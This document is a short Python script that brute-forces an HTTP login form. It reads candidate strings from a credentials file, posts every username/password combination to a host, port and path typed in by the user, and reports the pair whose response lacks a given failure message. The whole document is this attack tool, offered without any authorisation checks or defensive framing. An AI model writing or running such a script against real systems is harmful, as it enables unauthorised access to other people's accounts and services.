import http.client, urllib.parse
cred = []
host = input("Type host : ")
port = int(input("Type port : "))
resource = input("Type resource : ")
fail = input("Type fail statement : ")
flag = True
with open("credentials.txt") as file:
    for line in file:
        cred.append(line)
try:
    for user in cred:
        for passwd in cred:
            params = urllib.parse.urlencode({"user": user, "pass": passwd})
            connection = http.client.HTTPConnection(host, port)
            connection.request("POST", resource, params)
            res = connection.getresponse()
            data = res.read()
            if fail not in str(data):
                print("Success with {} {}".format(user, passwd))
                flag = False
                break
            connection.close()
        if not flag:
            break
    if flag:
        print("Failed!!!")
except Exception as e:
    print("Error is", e
)
